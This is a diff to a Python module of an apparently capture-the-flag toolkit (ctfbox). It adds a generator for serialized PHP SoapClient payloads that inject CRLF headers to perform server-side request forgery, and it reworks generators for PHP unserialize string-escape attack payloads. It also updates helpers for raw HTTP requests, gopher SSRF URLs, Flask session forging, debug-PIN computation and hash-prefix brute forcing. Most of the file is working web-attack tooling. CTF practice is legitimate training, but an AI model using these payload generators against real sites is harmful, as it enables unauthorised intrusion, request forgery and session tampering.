@@ -5,16 +5,17 @@ from http.server import HTTPServer
 from itertools import chain
 from json import loads
 from threading import Thread
-from typing import Union, List, Tuple
-from urllib.parse import quote
+from typing import Union, List, Tuple, Dict
+from urllib.parse import quote, quote_plus
 from hashlib import md5
 
 import requests
 from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
-                               ProvideArgumentError, GeneratePayloadError)
+                               ProvideArgumentError, GeneratePayloadError, HttprawError)
 from ctfbox.utils import random_string, Context, ProvideHandler, Threader
 from ctfbox.utils import md5 as _md5
 from ctfbox.utils import sha1, sha256, sha512
+from ctfbox.thirdparty.phpserialize import serialize
 
 
 class HashType(Enum):
@@ -31,6 +32,26 @@ contentType = str
 
 HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: sha1,
                  HashType.SHA256: sha256, HashType.SHA512: sha512}
+
+
+class SoapClient(object):
+    def __init__(self, url, user_agent: str = "", headers: Dict[str, str] = {}, post_data: str = ""):
+        self.uri = "hello"
+        self.location = url
+        self._stream_context = 0
+        user_agent = user_agent.strip()
+        post_data = post_data.strip()
+        new_headers = {}
+        if _is_json(post_data):
+            new_headers["Content-Type"] = "application/json"
+        else:
+            new_headers["Content-Type"] = "application/x-www-form-urlencoded"
+        new_headers.update(headers)
+        new_headers["Content-Length"] = len(post_data)
+        headers_string = "\r\n".join(
+            f"{k}: {v}" for k, v in new_headers.items())
+        self._user_agent = f"""{user_agent}\r\n{headers_string}\r\n\r\n{post_data}"""
+        self._soap_version = 1
 
 
 def _check_flask_import():
@@ -64,7 +85,7 @@ def _parse_form_data(body):
         file_lines = lines[start:end]
         split_index = file_lines.index(b'')
         file_headers = file_lines[1:split_index]
-        file_bodys = file_lines[split_index+1:end]
+        file_bodys = file_lines[split_index + 1:end]
         header = file_headers[0]
         content_type = ""
 
@@ -97,7 +118,7 @@ def _parse_form_data(body):
     return parse_dict
 
 
-def _generateTrush(diff_len: int, remain: int):
+def _generateTrash(diff_len: int, remain: int):
     pure_string_len = 12
     k = ceil((remain + pure_string_len) / diff_len)
     filed_len = k * diff_len - 12 - remain
@@ -160,7 +181,7 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
     return rv
 
 
-class App:
+class _App:
     def __init__(self, secret_key: str):
         self.secret_key = secret_key
 
@@ -192,7 +213,7 @@ def flask_session_encode(secret_key: str, payload: dict) -> str:
             "Please install moudle flask. e.g. python3 -m pip install flask")
     from flask.sessions import SecureCookieSessionInterface
     try:
-        app = App(secret_key)
+        app = _App(secret_key)
         scsi = SecureCookieSessionInterface()
         s = scsi.get_signing_serializer(app)
         return s.dumps(payload)
@@ -224,7 +245,7 @@ def flask_session_decode(session_data: str, secret_key: str) -> dict:
             "Please install moudle flask. e.g. python3 -m pip install flask")
     from flask.sessions import SecureCookieSessionInterface
     try:
-        app = App(secret_key)
+        app = _App(secret_key)
         scsi = SecureCookieSessionInterface()
         s = scsi.get_signing_serializer(app)
         return s.loads(session_data)
@@ -232,7 +253,8 @@ def flask_session_decode(session_data: str, secret_key: str) -> dict:
         raise FlaskSessionHelperError("Deocde error") from e
 
 
-def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,  files: List[Tuple[Union[filepath, content], routePath, contentType]] = {}):
+def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,
+            files: List[Tuple[Union[filepath, content], routePath, contentType]] = {}):
     """A simple and customizable http server.
 
     Args:
@@ -274,7 +296,8 @@ def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,  fil
             server.shutdown()
 
 
-def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange: int = 1000000, threadNum: int = 25, hashType: HashType = HashType.MD5) -> str:
+def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange: int = 1000000, threadNum: int = 25,
+             hashType: HashType = HashType.MD5) -> str:
     """A function used to blast the first few bits of the hash, often used to crack the ctf verification code.
 
     Args:
@@ -317,6 +340,7 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
     i = iter(range(maxRange))
     context = Context()
     hashfunc = HASHTYPE_DICT[hashType]
+
     @Threader(threadNum)
     def run(context):
         while context.value is None:
@@ -328,6 +352,7 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
                 context.value = True
                 return guess
         return -1
+
     tasks = [run(context) for _ in range(threadNum)]
 
     for task in tasks:
@@ -338,17 +363,22 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
         return task.result
 
 
-def httpraw(raw: Union[bytes, str], **kwargs) -> requests.Response:
+def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, requests.Request]:
     """Send raw request by python-requests
 
-   Args:
+    Args:
     raw(bytes/str): raw http request
     kwargs:
-        proxies(dict) : requests proxies
-        timeout(float): requests timeout
-        verify(bool)  : requests verify
-        real_host(str): use real host instead of Host if set
-        ssl(bool)     : whether https
+        proxies(dict) : requests proxies. Defaults to None.
+        timeout(float): requests timeout. Defaults to 60.
+        verify(bool)  : requests verify. Defaults to True.
+        real_host(str): use real host instead of Host if set.
+        ssl(bool)     : whether https. Defaults to False.
+        session(bool) : use this session instead of new session.
+        send(bool)    : whether to send the request. Defaults to True.
+
+    Raises:
+        HttprawError
 
     Returns:
         requests.Response: the requests response
@@ -357,6 +387,8 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> requests.Response:
         raw = raw.encode()
     # ? Origin: https://github.com/boy-hack/hack-requests
     raw = raw.strip()
+    send = kwargs.get("send", True)
+    session = kwargs.get("session", None)
     proxies = kwargs.get("proxy", None)
     timeout = kwargs.get("timeout", 60.0)
     verify = kwargs.get("verify", True)
@@ -413,7 +445,6 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> requests.Response:
             v = ""
         headers[k.decode()] = v.decode()
         index += 1
-    headers["Connection"] = "close"
     # ? get body
     if len(raws) < index + 1:
         body = b''
@@ -421,44 +452,55 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> requests.Response:
         body = b'\n'.join(raws[index + 1:]).lstrip()
 
     # ? get url
-    url = f"{scheme}://{host.decode()}:{port.decode()}/{path.decode()}"
+    port = port.decode()
+    if (port == "80" and scheme == "http") or (port == "443" and scheme == "https"):
+        url = f"{scheme}://{host.decode()}{path.decode()}"
+    else:
+        url = f"{scheme}://{host.decode()}:{port}{path.decode()}"
     # ? get content-length
-    if body and "Content-Length" not in headers and "Transfer-Encoding" not in headers:
-        headers["Content-Length"] = str(len(body))
+    # ? let requests to count it
     # ? deal with chunked
     if body and headers.get("Transfer-Encoding", '').lower() == "chunked":
         body = body.replace('\r\n', '\n')
         body = body.replace('\n', '\r\n')
         body = body + "\r\n" * 2
-    # ? deal with Content-Type
 
-    # ? deal with body
+    # ? deal with Content-Type and body
     parse_dict = {"files": {}, "data": {}}
-    if "Content-Type" not in headers:
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-    elif _is_json(body) and headers["Content-Type"] not in ["application/json", "multipart/form-data"]:
-        headers["Content-Type"] = "application/json"
-    if headers["Content-Type"] == "application/x-www-form-urlencoded":
-        body = dict([l.split(b"=")
-                     for l in body.strip().split(b"&") if b"=" in l])
-        body = {k.strip().decode(): v.strip().decode()
-                for k, v in body.items()}
-    elif headers["Content-Type"] == "multipart/form-data":
-        parse_dict = _parse_form_data(body)
-        body = parse_dict["data"]
+    if method.upper() == b"POST":
+        if "Content-Type" not in headers:
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+        if _is_json(body) and headers["Content-Type"] not in ["application/json", "multipart/form-data"]:
+            headers["Content-Type"] = "application/json"
+        if headers["Content-Type"] == "application/x-www-form-urlencoded":
+            body = dict([l.split(b"=")
+                        for l in body.strip().split(b"&") if b"=" in l])
+            body = {k.strip().decode(): v.strip().decode()
+                    for k, v in body.items()}
+        elif "multipart/form-data" in headers["Content-Type"]:
+            parse_dict = _parse_form_data(body)
+            body = parse_dict["data"]
+            del headers["Content-Type"]  # ? let requests to set Content-Type
 
     # ? prepare request
-    s = requests.Session()
-    req = requests.Request(method, url, data=body, files=parse_dict["files"])
+    if session:
+        if not isinstance(session, requests.Session):
+            raise HttprawError("Session invalid")
+    else:
+        session = requests.Session()
+    req = requests.Request(method, url, data=body, headers=headers, files=parse_dict["files"])
     prepped = req.prepare()
-    return s.send(prepped,
-                  proxies=proxies,
-                  timeout=timeout,
-                  verify=verify,
-                  )
+    if send:
+        return session.send(prepped,
+                            proxies=proxies,
+                            timeout=timeout,
+                            verify=verify,
+                            )
+    else:
+        return req
 
 
-def gopherraw(raw: str, host: str = "",  ssrfFlag: bool = True) -> str:
+def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     """Generate gopher requests URL form a raw http request
 
     Args:
@@ -492,7 +534,7 @@ def gopherraw(raw: str, host: str = "",  ssrfFlag: bool = True) -> str:
         if len(row) > 0 and row[-1] == "\r":
             data += quote(row + "\n")
         else:
-            data += quote("\r\n" + row)
+            data += quote(row + "\r\n")
 
         header = row.lower().strip()
         if header.startswith("host:"):
@@ -508,7 +550,7 @@ def gopherraw(raw: str, host: str = "",  ssrfFlag: bool = True) -> str:
     return header + data
 
 
-def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> Tuple[str, int]:
+def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
     """
     Use for generate short to long php unserialize escape attack payload
     Tips:
@@ -522,9 +564,8 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
 
 
     Returns:
-        Tuple: tuple[str, int]
-        tuple[0](str): generated payload
-        tuple[1](int): length of the generated payload
+        dict:
+            insert_data: The payload that caused the data modification
 
     Example:
         php_serialize_escape_s2l("x", "yy", '''s:8:"password";s:6:"123456"''')
@@ -536,54 +577,102 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     padding_len, remain = divmod(len(payload) + 4, diff_len)
     if remain != 0:
         if not paddingTrush:
-            raise GeneratePayloadError("Payload length error")
-        k, trush = _generateTrush(diff_len, remain)
+            raise GeneratePayloadError(
+                "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
+        k, trush = _generateTrash(diff_len, remain)
         padding_len += k
         payload = trush + payload
     payload = '";' + payload + ";}"
     result = src * padding_len + payload
-    return result, len(result)
+    result_dict = {
+        'insert_data': result
+    }
+    return result_dict
 
 
-def php_serialize_escape_l2s(src: str, dst: str, disString: str, payload: str, paddingTrush: bool = False) -> Tuple[str, int]:
+def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
     """
     Use for generate long to short php unserialize escape attack payload
+
     Tips:
         - only for php class unserialize
+
     Args:
         src(str): search string
         dst(str): replace string, this length must be shorter than search
-        disString(str): The php serialize data to be swallowed
         payload(str): the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+
     Returns:
-        Tuple: tuple[str, int]
-        tuple[0](str): generated payload
-        tuple[1](int): length of the generated payload
+        dict:
+            populoate_data: Data used to fill, causing characters to escape
+            trash_data: To fix the length error
+            insert_data: The payload that caused the data modification
 
     Example:
-        print(php_serialize_escape_l2s('aaaa', 'bb', 's:6:"passwd";s:5:"test1"', 's:6:"passwd";s:6:"123456"', True))
+        php_serialize_escape_l2s("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')
     """
+    eatString = "\";" + payload.split(';')[0] + f';s:{len(payload) + 4}:"'
+    # ": + payload + ;} --> len(payload) + 4
     diff_len = len(src) - len(dst)
     if diff_len <= 0:
-        raise GeneratePayloadError(
-            "src length must be greater than dst")
+        raise GeneratePayloadError("src length must be greater than dst")
 
-    padding_len, remain = divmod(len(disString) + 1, diff_len)
+    padding_len, remain = divmod(len(eatString), diff_len)
 
+    # There is no remainder
     if remain == 0:
-        result = (src * padding_len) + "\";" + \
-            disString + ";" + payload + ";}"
-        return result, len(src * padding_len)
+        populate_data = padding_len * src
+        insert_data = "\";" + payload + ";}"
+
+        result = {
+            'populoate_data': populate_data,
+            'insert_data': insert_data,
+            'trash_data': None
+        }
+
+        return result
+
+    # If there is a remainder, then pad trash data into the payload
     if not paddingTrush:
-        raise GeneratePayloadError("Payload length error")
+        raise GeneratePayloadError(
+            "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
 
-    trash_data = _generateTrush(diff_len, remain)[1]
-    trash_data += disString
-    padding_len, remain = divmod(len(trash_data) + 1, diff_len)
+    print('There is a remainder, the function will pad trash data into the payload to fix the length error')
 
-    if remain != 0:
-        raise GeneratePayloadError("Payload length Error")
+    for i in range(100):
+        padding_len, remain = divmod(len(eatString + (i * '@')), diff_len)
+        if remain == 0:
+            populate_data = padding_len * src
+            insert_data_with_trash = (i * '@') + "\";" + payload + ";}"
 
-    result = (src * padding_len) + "\";" + trash_data + ";" + payload + ";}"
-    return result, len(src * padding_len)
+            result = {
+                'populate_data': populate_data,
+                'insert_data': insert_data_with_trash,
+                'trash_data': (i * '@')
+            }
+            return result
+
+
+def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, str] = {}, post_data: str = "", encode: bool = True) -> Union[str, bytes]:
+    """Generate php soapClient class payload for ssrf
+
+    Args:
+        url (str): target url
+        user_agent (str, optional): the user agent. Defaults to "Syclover".
+        headers (Dict[str, str], optional): ohter headers. Defaults to {}.
+        post_data (str, optional): the data you want to post. Defaults to "".
+        encode (bool, optional): whether to encode payload. Defaults to False.
+
+    Returns:
+        Union[str, bytes]: generated payload
+    """
+    if not user_agent:
+        user_agent = "Syclover"
+    soap = SoapClient(url, user_agent, headers, post_data)
+    s = serialize(soap)
+    try:
+        s = s.decode()
+    except UnicodeDecodeError:
+        pass
+    return quote_plus(s)
